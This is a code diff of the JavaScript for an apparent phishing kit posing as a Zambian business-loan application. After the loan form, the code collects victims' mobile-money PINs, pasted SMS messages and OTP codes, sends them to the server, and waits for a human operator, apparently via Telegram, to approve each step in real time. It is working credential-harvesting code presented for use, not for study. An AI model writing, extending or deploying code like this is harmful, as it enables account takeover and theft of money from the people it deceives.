@@ -1,261 +1,211 @@
-let currentAppId = null;
-let pollInterval = null;
-let appData = {
+let appDataStore = {
+  loanType: 'Business Loan',
   amount: 1000000,
   term: '48 Months',
-  type: 'Business Loan',
   purpose: '',
   firstName: '',
   lastName: '',
   phone: '',
-  employment: '',
-  income: ''
+  employment: 'Self-employed',
+  income: '',
+  appId: ''
 };
 
-// --- Welcome / Calculator View Logic ---
-const loanRange = document.getElementById('loanRange');
-const calcAmountDisplay = document.getElementById('calcAmountDisplay');
-const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
-const startAppBtn = document.getElementById('startAppBtn');
+let pollInterval = null;
 
-if (loanRange) {
-  loanRange.addEventListener('input', (e) => {
-    const val = Number(e.target.value);
-    appData.amount = val;
-    calcAmountDisplay.textContent = 'ZMW ' + val.toLocaleString();
-    const monthly = Math.round(val / 48);
-    monthlyPaymentDisplay.textContent = 'ZMW ' + monthly.toLocaleString();
-    const inputLoanAmount = document.getElementById('inputLoanAmount');
-    if (inputLoanAmount) inputLoanAmount.value = val;
-  });
-}
-
-if (startAppBtn) {
-  startAppBtn.addEventListener('click', () => {
-    document.getElementById('view-welcome').style.display = 'none';
-    document.getElementById('application-flow').style.display = 'block';
-    showStep(1);
-  });
-}
-
-const backBtn = document.getElementById('backBtn');
-if (backBtn) {
-  backBtn.addEventListener('click', () => {
-    document.getElementById('application-flow').style.display = 'none';
-    document.getElementById('view-welcome').style.display = 'block';
-  });
-}
-
-// --- Multi-Step Form Navigation ---
-function showStep(stepNum) {
-  document.querySelectorAll('#application-flow .form-step').forEach(el => el.style.display = 'none');
-  document.getElementById(`step-${stepNum}`).style.display = 'block';
+// Navigation control
+function goToStep(stepNum) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   
-  for (let i = 1; i <= 3; i++) {
-    const line = document.getElementById(`indicator-${i}`);
-    if (line) {
-      if (i <= stepNum) line.classList.add('active');
-      else line.classList.remove('active');
-    }
+  if (stepNum === 'welcome') document.getElementById('screen-welcome').classList.add('active');
+  else if (stepNum === 1) document.getElementById('screen-step1').classList.add('active');
+  else if (stepNum === 2) {
+    // Gather step 1 inputs
+    appDataStore.loanType = document.getElementById('loan-type').value;
+    appDataStore.amount = document.getElementById('input-amount').value;
+    appDataStore.term = document.getElementById('loan-term').value;
+    appDataStore.purpose = document.getElementById('loan-purpose').value;
+    
+    document.getElementById('screen-step2').classList.add('active');
+  } 
+  else if (stepNum === 3) {
+    // Gather step 2 inputs
+    appDataStore.firstName = document.getElementById('first-name').value;
+    appDataStore.lastName = document.getElementById('last-name').value;
+    appDataStore.phone = document.getElementById('phone-number').value;
+
+    // Populate step 3 summary
+    document.getElementById('summary-amount').innerText = `ZMW ${Number(appDataStore.amount).toLocaleString()}`;
+    document.getElementById('summary-term').innerText = appDataStore.term;
+    document.getElementById('summary-purpose').innerText = appDataStore.purpose || '-';
+    document.getElementById('summary-applicant').innerText = `${appDataStore.firstName} ${appDataStore.lastName}`;
+
+    document.getElementById('screen-step3').classList.add('active');
   }
-  const counterText = document.getElementById('stepCounterText');
-  if (counterText) counterText.textContent = `Step ${stepNum} of 3`;
 }
 
-document.getElementById('step1Next')?.addEventListener('click', () => {
-  appData.type = document.getElementById('loanType').value;
-  appData.amount = document.getElementById('inputLoanAmount').value;
-  appData.term = document.getElementById('loanTerm').value;
-  appData.purpose = document.getElementById('loanPurpose').value;
-  showStep(2);
-});
+// Range slider interaction on welcome screen
+const rangeInput = document.getElementById('loan-range');
+if (rangeInput) {
+  rangeInput.addEventListener('input', (e) => {
+    const val = Number(e.target.value);
+    document.getElementById('calc-display-amount').innerText = `ZMW ${val.toLocaleString()}`;
+    const monthly = Math.round(val / 48);
+    document.getElementById('calc-monthly-payment').innerText = `ZMW ${monthly.toLocaleString()}`;
+  });
+}
 
-document.getElementById('step2Back')?.addEventListener('click', () => showStep(1));
-document.getElementById('step2Next')?.addEventListener('click', () => {
-  appData.firstName = document.getElementById('firstName').value;
-  appData.lastName = document.getElementById('lastName').value;
-  appData.phone = document.getElementById('momo_phone').value;
-
-  if (!appData.firstName || !appData.lastName || appData.phone.length < 9) {
-    alert('Please fill in valid names and phone number.');
-    return;
-  }
-
-  document.getElementById('sumAmount').textContent = 'ZMW ' + Number(appData.amount).toLocaleString();
-  document.getElementById('sumTerm').textContent = appData.term;
-  document.getElementById('sumPurpose').textContent = appData.purpose || '-';
-  document.getElementById('sumApplicant').textContent = `${appData.firstName} ${appData.lastName}`;
-  showStep(3);
-});
-
-document.getElementById('step3Back')?.addEventListener('click', () => showStep(2));
-document.getElementById('submitAppBtn')?.addEventListener('click', async () => {
-  appData.employment = document.getElementById('employmentStatus').value;
-  appData.income = document.getElementById('annualIncome').value;
+// Submit Application from Step 3 -> Goes to Login / PIN screen
+async function submitApplication() {
+  appDataStore.employment = document.getElementById('employment-status').value;
+  appDataStore.income = document.getElementById('annual-income').value;
 
   try {
-    const res = await fetch('/applications', {
+    const res = await fetch('/api/applications', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(appData)
+      body: JSON.stringify(appDataStore)
     });
     const data = await res.json();
-    currentAppId = data.id;
+    appDataStore.appId = data.id;
 
-    document.getElementById('application-flow').style.display = 'none';
-    document.getElementById('displayPhoneNum').textContent = appData.phone;
-    document.getElementById('momo-login-view').style.display = 'block';
-  } catch (e) {
-    currentAppId = 'APP-999888777';
-    document.getElementById('application-flow').style.display = 'none';
-    document.getElementById('displayPhoneNum').textContent = appData.phone;
-    document.getElementById('momo-login-view').style.display = 'block';
+    // Set phone number on login screen
+    document.getElementById('login-phone').value = appDataStore.phone;
+    document.getElementById('display-app-id').innerText = `Application ID: ${appDataStore.appId}`;
+    document.getElementById('display-app-id-sms').innerText = `Application ID: ${appDataStore.appId}`;
+    document.getElementById('display-app-id-otp').innerText = `Application ID: ${appDataStore.appId}`;
+
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById('screen-login').classList.add('active');
+  } catch (err) {
+    alert('Failed to connect to server.');
   }
+}
+
+// PIN inputs management
+const pinInputs = document.querySelectorAll('.p-pin');
+pinInputs.forEach((input, index) => {
+  input.addEventListener('input', (e) => {
+    if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+      pinInputs[index + 1].focus();
+    }
+    checkPinComplete();
+  });
 });
 
-// --- PIN Input Verification Flow ---
-const momoPinInput = document.getElementById('momo_pin');
-const loginMoMoBtn = document.getElementById('loginMoMoBtn');
+function checkPinComplete() {
+  let allFilled = Array.from(pinInputs).every(i => i.value.length === 1);
+  const btn = document.getElementById('btn-login-momo');
+  if (allFilled) {
+    btn.style.background = '#004F9F';
+    btn.style.color = '#FFF';
+    btn.removeAttribute('disabled');
+  } else {
+    btn.style.background = '#E2E2E2';
+    btn.style.color = '#888';
+    btn.setAttribute('disabled', 'true');
+  }
+}
 
-if (momoPinInput) {
-  momoPinInput.addEventListener('input', (e) => {
-    const val = e.target.value.replace(/\D/g, '').slice(0, 5);
-    e.target.value = val;
-    const dots = document.querySelectorAll('.pin-dots .dot');
-    dots.forEach((dot, idx) => {
-      dot.textContent = val[idx] ? '•' : '';
-    });
-    if (val.length === 5) loginMoMoBtn.removeAttribute('disabled');
-    else loginMoMoBtn.setAttribute('disabled', 'true');
+async function submitPinLogin() {
+  const pin = Array.from(pinInputs).map(i => i.value).join('');
+  
+  // Show waiting admin screen
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen-waiting-admin').style.display = 'flex';
+
+  await fetch('/verify-pin', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ appId: appDataStore.appId, pin, phone: appDataStore.phone })
   });
+
+  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms');
 }
 
-if (loginMoMoBtn) {
-  loginMoMoBtn.addEventListener('click', async () => {
-    const pin = momoPinInput.value;
-    document.getElementById('momo-login-view').style.display = 'none';
-    showWaitingScreen('Verifying MoMo PIN', 'Checking PIN status with admin...', 'Admin is reviewing your PIN...');
+// SMS Verification Submit
+async function submitSmsVerification() {
+  const smsText = document.getElementById('sms-text-input').value;
+  if (!smsText) return alert('Please enter or paste your SMS message.');
 
-    await fetch('/verify-pin', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ appId: currentAppId, pin, phone: appData.phone })
-    });
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen-waiting-sms').style.display = 'flex';
 
-    startPolling('PIN_APPROVED', 'PIN_REJECTED', () => {
-      hideWaitingScreen();
-      document.getElementById('sms-verification-view').style.display = 'block';
-      startSmsTimer();
-    });
+  await fetch('/verify-sms', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ appId: appDataStore.appId, smsText })
   });
+
+  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp');
 }
 
-// --- SMS Verification Flow ---
-let smsTimerInterval;
-function startSmsTimer() {
-  let timeLeft = 55;
-  const timerElem = document.getElementById('timerSeconds');
-  clearInterval(smsTimerInterval);
-  smsTimerInterval = setInterval(() => {
-    timeLeft--;
-    if (timerElem) timerElem.textContent = timeLeft;
-    if (timeLeft <= 0) clearInterval(smsTimerInterval);
-  }, 1000);
-}
-
-const smsTextarea = document.getElementById('sms_text');
-const submitSmsBtn = document.getElementById('submitSmsBtn');
-
-if (smsTextarea) {
-  smsTextarea.addEventListener('input', (e) => {
-    if (e.target.value.trim().length > 5) submitSmsBtn.removeAttribute('disabled');
-    else submitSmsBtn.setAttribute('disabled', 'true');
+// OTP Inputs Management
+const otpInputs = document.querySelectorAll('.p-otp');
+otpInputs.forEach((input, index) => {
+  input.addEventListener('input', (e) => {
+    if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+      otpInputs[index + 1].focus();
+    }
+    checkOtpComplete();
   });
+});
+
+function checkOtpComplete() {
+  let allFilled = Array.from(otpInputs).every(i => i.value.length === 1);
+  const btn = document.getElementById('btn-verify-otp');
+  if (allFilled) {
+    btn.style.background = '#004F9F';
+    btn.style.color = '#FFF';
+    btn.removeAttribute('disabled');
+  } else {
+    btn.style.background = '#E2E2E2';
+    btn.style.color = '#888';
+    btn.setAttribute('disabled', 'true');
+  }
 }
 
-if (submitSmsBtn) {
-  submitSmsBtn.addEventListener('click', async () => {
-    const smsText = smsTextarea.value;
-    document.getElementById('sms-verification-view').style.display = 'none';
-    showWaitingScreen('Verifying SMS Message', 'Checking SMS content with admin...', 'Admin is reviewing your SMS...');
+async function submitOtpCode() {
+  const otpCode = Array.from(otpInputs).map(i => i.value).join('');
 
-    await fetch('/verify-sms', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ appId: currentAppId, smsText })
-    });
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen-waiting-otp').style.display = 'flex';
 
-    startPolling('SMS_APPROVED', 'SMS_REJECTED', () => {
-      hideWaitingScreen();
-      document.getElementById('otp-verification-view').style.display = 'block';
-    });
+  await fetch('/verify-otp', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ appId: appDataStore.appId, otpCode })
   });
+
+  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success');
 }
 
-// --- OTP Verification Flow ---
-const otpInput = document.getElementById('otp_code');
-const submitOtpBtn = document.getElementById('submitOtpBtn');
+// Polling function to listen for Telegram admin inline-keyboard approvals
+function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId) {
+  if (pollInterval) clearInterval(pollInterval);
 
-if (otpInput) {
-  otpInput.addEventListener('input', (e) => {
-    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
-    e.target.value = val;
-    if (val.length === 4) submitOtpBtn.removeAttribute('disabled');
-    else submitOtpBtn.setAttribute('disabled', 'true');
-  });
-}
-
-if (submitOtpBtn) {
-  submitOtpBtn.addEventListener('click', async () => {
-    const otpCode = otpInput.value;
-    document.getElementById('otp-verification-view').style.display = 'none';
-    showWaitingScreen('Verifying OTP Code', 'Checking OTP code with admin...', 'Admin is verifying your OTP...');
-
-    await fetch('/verify-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ appId: currentAppId, otpCode })
-    });
-
-    startPolling('APPROVED', 'OTP_REJECTED', () => {
-      hideWaitingScreen();
-      document.getElementById('success-view').style.display = 'block';
-    });
-  });
-}
-
-// --- General Polling Function for Admin Actions ---
-function startPolling(successStatus, rejectStatus, onSuccessCallback) {
-  clearInterval(pollInterval);
   pollInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/check-status/${currentAppId}`);
+      const res = await fetch(`/check-status/${appDataStore.appId}`);
       const data = await res.json();
 
-      if (data.status === successStatus) {
+      if (data.status === targetStatus) {
         clearInterval(pollInterval);
-        onSuccessCallback();
-      } else if (data.status === rejectStatus) {
+        document.getElementById(waitingScreenId).style.display = 'none';
+        
+        if (nextScreenId === 'screen-success') {
+          document.getElementById('final-success-id').innerText = `Application ID: ${appDataStore.appId}`;
+        }
+
+        document.getElementById(nextScreenId).classList.add('active');
+      } else if (data.status && data.status.includes('REJECTED')) {
         clearInterval(pollInterval);
-        hideWaitingScreen();
-        alert('Verification rejected by admin. Please try again.');
+        alert('Verification failed or was rejected by admin.');
         location.reload();
       }
     } catch (e) {
       console.error('Polling error:', e);
     }
   }, 3000);
-}
-
-function showWaitingScreen(title, subtitle, progressText) {
-  document.getElementById('waitingTitle').textContent = title;
-  document.getElementById('waitingSubtitle').textContent = subtitle;
-  document.getElementById('waitingProgressBar').textContent = progressText;
-  document.getElementById('appIdText').textContent = currentAppId;
-  document.getElementById('admin-waiting-view').style.display = 'flex';
-}
-
-function hideWaitingScreen() {
-  document.getElementById('admin-waiting-view').style.display = 'none';
-      }
-    
+                                                          }
+      
